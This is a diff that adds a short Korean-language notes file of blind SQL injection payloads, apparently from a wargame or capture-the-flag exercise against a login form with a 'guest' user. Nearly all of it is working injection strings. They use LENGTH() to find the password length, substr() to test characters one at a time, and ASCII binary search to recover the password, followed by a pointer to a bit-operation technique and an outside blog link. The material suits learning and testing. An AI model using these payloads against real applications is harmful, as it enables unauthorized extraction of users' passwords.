@@ -1,0 +1,19 @@
+payload
+--------------------------------
+-> substr의 index 조절로 패스워드 길이 확인
+guest' and LENGTH(upw)=5; #exists
+
+-> substr 활용한 참, 거짓
+guest' and substr(upw,1,1)='g    #exists
+guest' and substr(upw,2,1)='u    #exists
+guest' and substr(upw,3,1)='e    #exists
+
+-> Binary Search를 통한 Blind SQLI도 동작 확인(아스키번호 32~126)
+guest' and ascii(substr(upw,1,1))>='102    #exists
+guest' and ascii(substr(upw,2,1))>='117    #exists
+guest' and ascii(substr(upw,3,1))>='101    #exists
+guest' and ascii(substr(upw,4,1))>='115    #exists
+guest' and ascii(substr(upw,5,1))>='116    #exists
+
+-> bit연산으로 한 바이트씩 파악
+refer to ...) https://yun-2.tistory.com/entry/blind-sql-injection-advanced
